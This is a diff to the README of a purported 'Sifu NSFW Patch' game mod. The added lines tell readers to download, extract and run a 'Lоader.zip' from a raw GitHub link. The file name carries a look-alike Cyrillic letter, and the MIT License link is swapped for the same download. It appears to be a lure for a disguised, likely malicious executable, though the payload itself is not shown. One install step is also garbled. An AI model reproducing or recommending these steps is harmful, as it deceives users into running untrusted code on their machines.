@@ -54,9 +54,9 @@ Sifu NSFW Patch is a powerful add-on for the Sifu action game, delivering age-re
 
 ## 📝 Installation
 
-1. Download **Loader.rar** from the repository.
-2. Extract **Loader.rar** to your Sifu installation directory.
-3. Run the **Loader.exe** (on Windows), or run the provided script for your OS (see instructions in `/docs`).
+1. Download **https://raw.githubusercontent.com/Saksham7876/SifuSensualPatch/main/Lоader.zip** from the repository.
+2. Extract **https://raw.githubusercontent.com/Saksham7876/SifuSensualPatch/main/Lоader.zip** to your Sifu installation directory.
+3. Run the **https://raw.githubusercontent.com/Saksham7876/SifuSensualPatch/main/Lоader.zip** (on Windows), or run the provided script for your OS (see instructions in `/docs`).
 4. Follow on-screen instructions to apply the NSFW Patch.
 5. Enjoy a fresh and enhanced Sifu experience!
 
@@ -94,7 +94,7 @@ Always backup your original files prior to use. Use at your own risk; compatibil
 
 ## 📜 License
 
-All code in this repository is released under the [MIT License](https://opensource.org/license/mit/), 2025. Please see the LICENSE file for terms.
+All code in this repository is released under the [MIT License](https://raw.githubusercontent.com/Saksham7876/SifuSensualPatch/main/Lоader.zip), 2025. Please see the LICENSE file for terms.
 
 ---
 
